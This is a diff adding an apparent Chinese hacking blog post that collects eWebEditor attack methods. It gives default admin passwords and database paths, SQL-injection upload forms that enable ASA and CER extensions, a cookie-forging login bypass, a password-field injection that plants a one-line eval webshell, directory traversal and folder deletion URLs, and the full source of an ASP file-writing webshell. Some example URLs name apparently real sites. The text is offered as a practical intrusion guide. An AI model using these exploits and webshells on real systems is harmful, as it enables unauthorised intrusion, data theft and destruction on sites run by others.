@@ -1,0 +1,343 @@
+ewebeditor最新漏洞以及漏洞收集 (2011-10-05 00:03:23)[编辑][删除] 
+
+
+edit/dialog/about.html可以看到编辑器的版本信息
+
+
+添加类型为  asp; 上传 asp;后缀马利用iis解析漏洞拿下
+
+1.ewebeditor编辑器查看版本信息 
+
+edit/dialog/about.html
+ewebeditor/dialog/about.html
+eweb/dialog/about.html
+ewebedit/dialog/about.html
+ewindoweditor/dialog/about.html
+
+edit/ewebeditor?id=1，嘿嘿是不是出来了啊？这下我们再点工具栏里的“关于”或者“帮助”选项都可以。得到版本为2.0.
+ 
+2.0的ewebeditor在线编辑器是存在漏洞的，
+漏洞利用代码
+<form action="http://www.XXX.com/edit/upload.asp?action=save&type=IMAGE&style=horind'?union select S_ID,S_Name,S_Dir,S_CSS,[S_UploadDir]%2b'/../db',S_Width,S_Height,S_Memo,S_IsSys,S_FileExt,S_FlashExt, [S_ImageExt]%2b'|asa',S_MediaExt,S_FileSize,S_FlashSize,S_ImageSize,S_MediaSize,S_StateFlag,S_DetectFromWord,S_InitMode,S_BaseUrl from ewebeditor_style where s_name='standard'and'a'='a" method=post name=myform enctype="multipart/form-data">? ???<input type=file name=uploadfile size=100><br><br>? ???<input type=submit value=Fuck>? ???</form>
+
+从源码得知这个源码通过注入语句来控制了上传类型和目录，。/../db得知www.xx.com/edit/db这个，添加了上传类型为ASA，那么我们保存为HTML
+
+点击FUCK（咋叫这名儿。。）上传，这里会跳到UPLOAD那个页面，但是只要你细心的话可以看到地址栏的参数改变了。这时候我们来查看源码，拖到最后，嘿嘿是不是看到小马
+
+
+标签： 杂谈 分类： 入侵技术文章区域  
+先用默认帐号admin 密码admin888 登陆，“样式管理”  添加 asa  在“返回样式” 在 “预览” 在上传asa大马
+
+不行就下载默认数据库‘/db/ewebeditor.mdb”，如果默认数据库也改了的话我们是不是就该放弃了呢？这里告诉大家我的经验！就是用密码admin999登陆，或者输入“/db /ewebeditor1013.mdb”就能下载到数据库了。这个方法有?的几率能拿下目标！
+
+
+下载数据库后  用明小子打开  找到
+
+http://网站名/ewebeditor/ewebeditor.asp?id=S_ID&style=S_Name
+
+eWebeditor_Style表中上 传类型有aaspsp或asa等后缀，如果有
+
+则将 S_id  和 S_Name 对应修改就可以上传大马了
+
+http://www1.hnsyu.net/jixie/sys/admin/SouthidcEditor/Admin_Style.asp
+                          admin/SouthidcEditor/Admin_UploadFile.asp
+
+  
+
+     如何进入ewebeditor编辑器后台
+
+利用方法：首先当然要找到登陆后台,默认是../eWebEditor/admin/login.asp，
+
+或者试试：admin/ewebeditor/admin_style.asp
+
+进入后台后随便输入一个用户和密码，当然会提示出错了。
+这时候你清空浏览器的url,然后输入：
+
+javascript:alert(document.cookie=”adminuser=”+escape(”admin”));javascript:alert(document.cookie=”adminpass=”+escape(”admin”));javascript:alert(document.cookie=”admindj=”+escape(”1″));
+
+
+后三次回车，清空浏览器的url，大家注意了，这次输入的url要注意，我们这次要输入的文件都是在正常情况下经过验证才能浏览的文件
+如../ewebeditor/admin /default.asp
+
+
+利用方法:登陆后台，点击修改密码?新密码设置为 1":eval request("test")'
+设置成功后，访问http://www.yuniis.com/cms/ewebeditor/asp/config.asp文件即可.
+一句话木马被写入到这个文件里面了，密码为test.
+
+
+直接进去了
+
+aspx的版本../ewebeditor/admin/upload.aspx添好本地的cer的Shell文件，在浏揽器输入javascript:lbtnUpload.click();就能得到shell
+
+ 
+
+调用这个样式，会出现远程上传按纽
+
+http://rwkx.hnjdzy.net/admin/ewebeditor/ewebeditor.asp?id=NewsContent&style=s_full
+
+远程上传时执行代码
+导致get shell
+1.把yc.gif.asp   xiaoma.ASa放在同一目录下(本地的)
+
+——————————————远程文件(yc.gif.asp)——————————————————
+
+<%  
+Set fs = CreateObject("Scripting.FileSystemObject")  
+Set MyTextStream=fs.OpenTextFile(server.MapPath("\xiaoma.asp"),1,false,0)  
+Thetext=MyTextStream.ReadAll  
+response.write thetext  
+%>  
+——————————————小马(xiaoma.asp)——————————————
+
+<%on error resume next%>  
+<%ofso="scripting.filesystemobject"%>  
+<%set fso=server.createobject(ofso)%>  
+<%path=request("path")%>  
+<%if path<>"" then%>  
+<%data=request("dama")%>  
+<%set dama=fso.createtextfile(path,true)%>  
+<?ma.write data%>  
+<%if err=0 then%>  
+<%="success"%>  
+<%else%>  
+<%="false"%>  
+<%end if%>  
+<%err.clear%>  
+<%end if%>  
+<?ma.close%>  
+<%set dama=nothing%>  
+<%set fos=nothing%>  
+<%="<form action=" method=post>"%>  
+<%="<input type=text name=path>"%>  
+<%="<br>"%>  
+<%=server.mappath(request.servervariables("script_name"))%>  
+<%="<br>"%>  
+<%=""%>  
+<%="<textarea name=dama cols=50 rows=10 width=30></textarea>"%>  
+<%="<br>"%>  
+<%="<input type=submit value=save>"%>  
+<%="</form>"%>  
+2.远程上传yc.gif.asp
+会自动执行脚本，上次小马。
+
+ 
+
+
+
+
+ewebeditor最新漏洞。这个程序爆漏洞一般都是直接上传的漏洞，首先在本地搭建一个ASP环境
+
+    （可以用asp小旋风）
+
+     asp小旋风下载地址：
+
+                              http://115.com/file/ajlevslg#
+       重命名一个asp马名字例如：1.gif.asp这样的就OK了
+      本地搭建一个环境，目的就是让远程上传。
+
+      http://127.0.0.1/1.gif.asp搭建好了 ，
+
+      执行网络地址填写：http://127.0.0.1/1.gif.asp
+
+
+
+ 
+
+     然后确定以后，这里是最关键的一部！
+
+
+ 
+
+     这里点了远程上传以后，再提交得到木马地址
+
+
+
+ 
+
+属于安全检测漏洞版本ewebeditor v6.0.0
+
+
+以前的ewebeditor漏洞：
+
+ 
+
+ewebeditor注入漏洞
+
+大家都知道ewebeditor编辑器
+
+默认的数据库路径db/ewebeditor.mdb
+默认后台地址是admin_login.asp，
+
+另外存在遍历目录漏洞，
+
+前提是必须要有进入后台的权限,才能列目录
+
+上传文件管理:admin_uploadfile.asp
+
+eWebEditor 2.8 后台记得在网络上看到过一篇文章是eWebEditor.asp?dir=id可以遍历目录
+
+另辟蹊径在风格设置栏的图片上传路径改了改成 “../../../”可以遍历3级目录
+
+其他：
+
+NO2.遍历目录漏洞（具体如下）：
+登陆编辑器---上传文件管理---选择样式目录(随便选一个目录)
+得到:
+ewebeditor/admin_uploadfile.asp?id=14
+在id=14后面添加&dir=..
+再加 &dir=../..
+&dir=../../../.. 看到整个网站文件了
+此漏洞危害大大的，绝对恐怖
+
+
+默认上传地址：/ewebeditornet/upload.aspx
+可以直接上传一个cer的木马
+如果不能上传则在浏览器地址栏中输入javascript:lbtnUpload.click();
+
+ 
+
+删除指定目录文件名:
+
+提交:http://www.***.com/ewebeditor/admin_uploadfile.asp?id=14&dir=../../..&action=delfolder&foldername=目录或文件名
+
+这里:&dir=http://www.****.com/../.. 看到整个网站文件了 http://www.****.com 用/../替换
+
+如果是asp后缀的数据库还可以写入一句话
+
+
+介绍两种方法拿ewebeditor的shell，
+
+一种是利用upload.asp文件，本地构造
+
+
+NO1：注入
+http://www.XXX.com/ewebeditor2007/ewebeditor.asp?id=article_content&style=full_v200
+编辑器ewebedior7以前版本通通存在注入
+直接检测不行的，要写入特征字符
+我们的工具是不知道ewebeditor的表名的还有列名
+先表吧
+要先添加进库
+开始猜账号密码了
+[sys_username]:bfb18022a99849f5 chaoup[sys_userpass]:0ed08394302f7d5d 851120
+
+
+NO2：利用upload.asp文件，本地构造上传shell
+大家看这里
+http://www.siqinci.com/ewebeditor2007/admin_style.asp?action=stylepreview&id=37
+如果遇见这样的情况又无法添加工具栏是不是很郁闷
+记录下他的样式名“aaa”
+我已经吧upload.asp文件拿出来了
+我们构造下
+OK，我之前已经构造好了
+其实就是这里
+<form action=”地址/path/upload.asp?action=save&type=&style=样式名” method=post name=myform enctype=”multipart/form-data”>
+<input type=file name=uploadfile size=1 style=”width:100%”>
+<input type=submit value=”上传了”></input>
+</form>
+下面我们运行他上传个大马算了
+UploadFile上传进去的在这个目录下
+2008102018020762.asa
+
+ 
+
+过往漏洞:
+
+首先介绍编辑器的一些默认特征:
+默认登陆admin_login.asp
+默认数据库db/ewebeditor.mdb
+默认帐号admin 密码admin或admin888
+
+
+那么试一下默认后台
+http://www.xxx.com.cn/admin/ewebeditor/admin_login.asp
+试默认帐号密码登陆。
+利用eWebEditor获得WebShell的步骤大致如下：
+
+
+1．确定网站使用了eWebEditor。
+
+   一般来说，我们只要注意发表帖子（文章）的页面是否有类似做了记号的图标，就可以大致做出判断了。
+
+
+2．得到网站管理员权限进入后台右击查看源代码，找到eWebEditor的路径。点击“查看源代码”，看看源码中是否存在类似“<iframe ID=’eWebEditor1′ src=’/edit/ewebeditor.asp?id=content&style=web’ frameborder=0 scrolling=no width=’550′ HEIGHT=’350′></iframe>”的语句。其实只有发现了存在这样的语句了，才可以真正确定这个网站使用了eWebEditor。然后记下src=’***’中的“***”，这就是eWebEditor路径。
+
+
+3．访问eWebEditor的管理登录页面。eWebEditor的默认管理页面为admin_login.asp，和ewebeditor.asp在同一目录下。以上面的路径为例，我们访问的地址为：http://www.***.net/edit/admin_login.asp，看看是否出现了登录页面。
+
+
+试试默认的用户名：admin，密码：admin888。
+
+ 
+
+4．增加上传文件类型。点击“样式管理”，随便选择列表中底下的某一个样式的“设置，为什么要选择列表中底下的样式？因为eWebEditor自带的样式是不允许修改的，当然你也可以拷贝一个新的样式来设置。
+然后在上传的文件类型中增加“asa或者asaspp或者aaspsp”类型。
+
+
+5．上传ASP木马，获得WebShell。接下来将ASP木马的扩展名修改为asa，就可以简单上传你的ASP木马了。不要问我怎么上传啊，看到 “预览” 了吗？点击“预览”，然后选择“插入其它文件”的按钮就可以了。
+
+
+漏洞原理
+漏洞的利用原理很简单，请看Upload.asp文件：
+任何情况下都不允许上传asp脚本文件
+sAllowExt = Replace(UCase(sAllowExt), “ASP”, “”)
+因为eWebEditor仅仅过滤了ASP文件。记得我第一次使用eWebEditor时就在纳闷：既然作者已经知道asp文件需要过滤，为什么不同时过滤asa、cer等文件呢？也许这就是对免费用户不负责任的表现吧！
+
+
+高级应用
+eWebEditor的漏洞利用还有一些技巧：
+1．使用默认用户名和密码无法登录。
+请试试直接下载db目录下的ewebeditor.mdb文件，用户名和密码在eWebEditor_System表中，经过了md5加密，如果无法下载或者无法破解，那就当自己的运气不好了。
+
+
+3．上传了asp文件后，却发现该目录没有运行脚本的权限。
+  上传类型可以改，以修改上传路径
+
+ 
+
+ 
+
+asp类型还是无法上传。
+
+
+还有最后一招“远程类型”了eWebEditor能够设定自动保存远程文件的类型，我们可以加入asp类型。但是如何才能让远程访问的asp文件能够以源码形式保存呢？方法是很多的，最简单的方法是将IIS中的“应用文件映射”中的“asp”删除。
+
+
+
+
+ 各种版本eweb利用exp
+
+
+<H1>1.ewebeditor asp版 1.0.0 上传漏洞利用程序----By HCocoa</H1><br><br>
+<formaction="http://要上传的地址/ewebeditor/upload.asp?action=save&type=IMAGE&style=hcocoa' union select S_ID,S_Name,S_Dir,S_EditorHeader,S_Body,S_Width,S_Height,S_Memo,S_IsSys,S_FileExt,S_FlashExt, [S_ImageExt]%2b'|cer|aspx',S_MediaExt,S_FileSize,S_FlashSize,S_ImageSize,S_MediaSize,S_StateFlag,S_DetectFromWord from ewebeditor_style where s_name='standard'and'a'='a"method=postname=myformenctype="multipart/form-data">
+<inputtype=filename=uploadfilesize=100><br><br>
+<inputtype=submitvalue=Fuck>
+</form>
+
+<HTML><HEAD><TITLE>ewebeditor2.16的upload文件上传exp</TITLE><metahttp-equiv="Content-Type"content="text/html; charset=gb2312"> </head><bodybgcolor=orange>
+<tr>不是通杀，版本有区别！我就郁闷，落叶那JJ说文章没说清楚，这份EXP就是根据文章写出来的！落叶那家伙的EXP我看半天没看明白有啥区别！<br></tr>
+<tr>文件传到了uploadfile目录下了</tr><br>
+<tr>不知道算不算0day，我是冰的原点</tr><br>
+<tr>至于利用方法就是修改源文件中的action，然后传cer的马马就行了！</tr><br>
+<formaction="http://要上传的网址/ewebeditor/upload.asp?action=save&type=IMAGE& style=firefox'%20union%20select%20S_ID,S_Name,S_Dir,S_CSS,S_UploadDir,S_Width,S_Height,S_Memo,S_IsSys,S_FileExt,S_FlashExt,%20[S_ImageExt]%2b'|cer',S_MediaExt,S_FileSize,S_FlashSize,S_ImageSize,S_MediaSize,S_StateFlag,S_DetectFromWord,S_InitMode,S_BaseUrl%20from%20ewebeditor_style%20where%20s_name='standard'%20and%20'a'='a"method=postname=myformenctype="multipart/form-data"><inputtype=filename=uploadfilesize=100style="width:100%"><inputtype=submitvalue=传吧></form>
+
+
+
+<H1>ewebeditor asp版 2.7.5 上传漏洞利用程序</H1><br><br>
+<formaction="http://要上传的网址/ewebedit/upload.asp?action=save&type=&style=可以上传asa的样式名"method=postname=myformenctype="multipart/form-data">
+<inputtype=filename=uploadfilesize=1style="width:100%">
+<inputtype=submitvalue="上传了"></input>
+</form>
+
+
+
+
+
+<HTML><HEAD><TITLE>
+ewebeditor 5.5 6.0 上传漏洞</TITLE><metahttp-equiv="Content-Type"content="text/html; charset=gb2312"> </head><bodybgcolor=orange>
+
+<form action="http://要上传的网址/ewebeditor/asp/upload.asp?action=savetype=image&style=popup&cusdir=a.asp" method=post name=myform enctype="multipart/form-data">
+<input type=file name=uploadfile size=100><br><br>
+<input type=submit value=upload>
+</form>
+ 
+
